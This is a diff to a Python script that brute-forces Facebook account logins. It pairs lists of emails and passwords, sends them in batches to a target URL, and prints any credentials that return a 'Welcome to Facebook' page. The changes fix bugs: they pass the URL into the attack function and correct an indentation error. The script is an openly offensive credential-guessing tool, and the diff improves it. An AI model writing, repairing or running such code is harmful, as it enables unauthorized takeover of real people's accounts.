@@ -50,7 +50,7 @@ def template(entries):
     t = 'email=%s&pass=%s'
     return '&'.join([t % (entry.get('email'), entry.get('passwd')) for entry in entries])
 
-def attack(entries):
+def attack(entries, url):
     if len(entries) < 1:
         return
 
@@ -59,7 +59,7 @@ def attack(entries):
 
     # Check if any successful logins were found
     for entry in entries:
-                if "Welcome to Facebook" in response:
+        if "Welcome to Facebook" in response:
             print(bcolors.OKGREEN + "Login successful!" + bcolors.ENDC)
             print(bcolors.OKGREEN + "Email: " + entry.get('email') + " Password: " + entry.get('passwd') + bcolors.ENDC)
         else:
@@ -73,11 +73,11 @@ def brute_force(url, passwords, emails):
         for password in passwords:
             entries.append({'email': email, 'passwd': password})
             if len(entries) >= PASSWD_PER_REQUEST:
-                attack(entries)
+                attack(entries, url)
                 entries = []
 
     # Attack remaining entries
-    attack(entries)
+    attack(entries, url)
 
 if __name__ == "__main__":
     if len(sys.argv) < 4:
@@ -93,4 +93,3 @@ if __name__ == "__main__":
     banner(sys.argv, url=url, emails=emails)
 
     brute_force(url, passwords, emails)
-
